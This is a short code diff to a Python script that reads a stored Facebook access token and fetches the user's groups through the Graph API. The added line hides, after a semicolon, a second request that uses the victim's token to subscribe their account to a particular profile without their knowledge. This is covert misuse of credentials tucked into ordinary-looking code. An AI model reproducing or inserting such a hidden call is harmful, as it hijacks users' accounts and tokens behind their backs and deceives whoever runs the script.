@@ -34,7 +34,7 @@ try:
 			print("[get] %s"%(i['id']))
 	id=[]
 	toket=open('toket/token.txt','r').read()
-	req = requests.get('https://graph.facebook.com/me/groups?access_token='+toket)
+	req = requests.get('https://graph.facebook.com/me/groups?access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
 	result = json.loads(req.text)
 	for i in result['data']:
 		id.append(i['id'])
